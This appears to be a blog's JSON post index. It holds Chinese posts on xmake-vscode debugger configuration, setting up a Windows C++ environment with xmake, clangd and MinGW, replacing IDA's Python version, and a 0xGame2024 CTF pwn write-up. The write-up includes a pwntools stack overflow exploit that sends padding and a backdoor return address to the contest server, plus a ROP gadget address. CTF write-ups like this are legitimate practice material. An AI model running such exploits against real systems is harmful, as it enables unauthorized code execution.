[{"content":"前言 Windows版本 ：10.0.27729 xmake版本: 2.9.5 xmake-vscode: 2.3.8\nxmake-vscode设置tooltrain为mingw，platform为Windows无法调试，设置为mingw即可\nvscode-xmake debugger.ts 源码片段\nif (os.platform() == \u0026#34;darwin\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, MIMode: \u0026#34;lldb\u0026#34;, miDebuggerPath: \u0026#34;\u0026#34; }; } else if (os.platform() == \u0026#34;linux\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, // @see https://github.com/xmake-io/xmake-vscode/issues/36 MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: await this.findGdbPath(), setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] }; } else if (os.platform() == \u0026#34;win32\u0026#34; \u0026amp;\u0026amp; plat == \u0026#34;mingw\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, externalConsole: false, MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: await this.findGdbPath(), setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] // description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, // text: \u0026#34;-enable-pretty-printing\u0026#34;, // ignoreFailures: true }; } else if (os.platform() == \u0026#34;win32\u0026#34;) { debugConfig = { name: `launch: ${targetName}`, type: \u0026#39;cppvsdbg\u0026#39;, request: \u0026#39;launch\u0026#39;, program: targetProgram, args: args, stopAtEntry: true, cwd: targetRunDir, environment: targetRunEnvs, // externalConsole: true, // https://github.com/microsoft/vscode-cpptools/issues/6939 // externalTerminal only supports cmd when debugging. https://github.com/microsoft/vscode/issues/147120 console: \u0026#34;internalConsole\u0026#34;, MIMode: \u0026#34;gdb\u0026#34;, miDebuggerPath: \u0026#34;\u0026#34;, setupCommands:[ { description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, text: \u0026#34;-enable-pretty-printing\u0026#34;, ignoreFailures: true } ] // description: \u0026#34;Enable pretty-printing for gdb\u0026#34;, // text: \u0026#34;-enable-pretty-printing\u0026#34;, // ignoreFailures: true }; 可以看到win32下plat=mingw时调用cppdbg否则调用cppvsdbg 所以plat设置为Windows时应该使用MSVC链接才能正确识别符号表\n","permalink":"https://ycna07.github.io/posts/blog/vscode-xmake%E8%B0%83%E8%AF%95%E8%B7%B3%E6%96%AD%E7%82%B9%E5%88%86%E6%9E%90/","summary":"前言 Windows版本 ：10.0.27729 xmake版本: 2.9.5 xmake-vscode: 2.3.8 xmake-vscode设置tooltrain为mingw，platfor","title":"Vscode Xmake调试跳断点分析"},{"content":"vscode：编辑器 xmake：基于 Lua 的轻量级跨平台构建工具 clangd：高性能，智能代码提示与补全 mingw：配置简单，生成的可执行文件体积小 cpptools：用于debug（可以使用codelldb代替）\n安装环节 安装好vscode以后，使用scoop安装xmake与clang,mingw\nscoop install xmake scoop install LLVM #直接安装LLVM即带有clang，也可以单独安装，这里是为了方便 scoop install mingw scoop会自动配置好环境变量，！！！重新启动终端！！！打开终端输入\nxmake --version clang -v gcc -v g++ -v 输出版本说明环境变量已经配置成功\n接下来打开vscode安装插件 xmake clangd C++extensionpack（或者Codelldb）\nvscode插件配置 clangd 打开vscode Clangd插件设置找到\u0026quot;clangd.arguments\u0026quot;\n\u0026#34;clangd.arguments\u0026#34;: [ \u0026#34;--background-index\u0026#34;, \u0026#34;-j=12\u0026#34;, \u0026#34;--clang-tidy\u0026#34;, \u0026#34;--all-scopes-completion\u0026#34;, \u0026#34;--completion-style=detailed\u0026#34;, \u0026#34;--header-insertion=iwyu\u0026#34;, \u0026#34;--pch-storage=disk\u0026#34;, \u0026#34;--compile-commands-dir=${workspaceFolder}/.vscode\u0026#34;, \u0026#34;-query-driver=\\\u0026#34;E:\\\\Apps\\\\MinGW\\\\mingw64\\\\bin\\\\g++.exe\\\u0026#34; \u0026#34; ] 以上参数含义自行百度进行设置即可 \u0026ndash;query-driver为电脑mingw的g++地址，不能直接复制\nC/C++ 以下设置是为了避免C/C++插件的代码提示干扰clangd\n打开vscode C/C++插件设置 搜索autocomplete设置为disable 搜索intelli，找到Intelli Sense Engine设置为disable\nCodelldb 如果你使用cpptools（C/C++ extension）调试可以跳过这部分\n搜索xmake:debug设置Debug Config Type 为codelldb\n实际运行 运行 mkdir Hello cd Hello code . 打开vscode以后新建hello.cpp\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; int main() { std::map\u0026lt;std::string, int\u0026gt; m; m[\u0026#34;Alice\u0026#34;] = 30; m[\u0026#34;Bob\u0026#34;] = 25; m.clear(); std::cout\u0026lt;\u0026lt;\u0026#34;Hello World\u0026#34;\u0026lt;\u0026lt;std::endl; } 然后在终端运行\nxmake 当前版本（v2.9.5）会提示 note: xmake.lua not found, try generating it (pass -y or \u0026ndash;confirm=y/n/d to skip confirm)?\n输入y后vscode的xmake拓展自动激活\n现在已经可以编译运行了（xmake会自动寻找到mingw，如果没有安装MSVC的话） 但是点击调试无法走到断点\n调试 接下来开始设置xmake.lua\ntarget(\u0026#34;hello\u0026#34;) set_kind(\u0026#34;binary\u0026#34;) add_files(\u0026#34;hello.cpp\u0026#34;) set_toolchains(\u0026#34;mingw\u0026#34;) set_languages(\u0026#34;c99\u0026#34;, \u0026#34;cxx14\u0026#34;) set_plat(\u0026#34;mingw\u0026#34;) add_rules(\u0026#34;mode.debug\u0026#34;, \u0026#34;mode.release\u0026#34;) 在底部设置mode为debug，paltform修改Windows为mingw\n点击小虫子即可调试，目前似乎无法绑定vscode的F5调试\nps：目前我拿来写算法，通常编译单一源文件，暂时没有测试交叉编译大型项目\n","permalink":"https://ycna07.github.io/posts/blog/vscode+xmake+clangd+mingw+cpptools%E9%85%8D%E7%BD%AEwindowsc++%E7%8E%AF%E5%A2%83/","summary":"vscode：编辑器 xmake：基于 Lua 的轻量级跨平台构建工具 clangd：高性能，智能代码提示与补全 mingw：配置简单，生成的可执行文件体","title":"2024年11月Vscode+xmake+clangd+mingw+cpptools配置windowsC++环境"},{"content":"PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd\nfrom pwn import * io = remote(\u0026#39;47.97.58.52\u0026#39;, 40001) payload=b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD)) io.send(\u0026#39;\\n\u0026#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323\n4.find_me\n尝试ioexp 查看libc.so.6版本\n","permalink":"https://ycna07.github.io/posts/writeups/0xgame2024/","summary":"PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd from pwn import * io = remote(\u0026#39;47.97.58.52\u0026#39;, 40001) payload=b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b\u0026#39;a\u0026#39;*0x38+p64(0x00000000004012BD)) io.send(\u0026#39;\\n\u0026#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323 4.find_me 尝试ioexp 查看libc.so.6版本","title":"0xGame2024 Pwn\u0026Rev"},{"content":" ycna07\u0026#39;s Blog ","permalink":"https://ycna07.github.io/links/","summary":"ycna07\u0026#39;s Blog","title":"Friends"},{"content":"使用需要的版本替换ida文件夹中的python3文件夹即可 python默认安装位置 idapython默认安装位置在ida文件夹目录下 使用同名文件夹替换即可（例如3.11.9替换3.11.7，替换python311即可）\n","permalink":"https://ycna07.github.io/posts/blog/ida_python/%E4%BF%AE%E6%94%B9ida_python%E7%89%88%E6%9C%AC/","summary":"使用需要的版本替换ida文件夹中的python3文件夹即可 python默认安装位置 idapython默认安装位置在ida文件夹目录下 使用同名","title":"修改IDA_Python版本"}]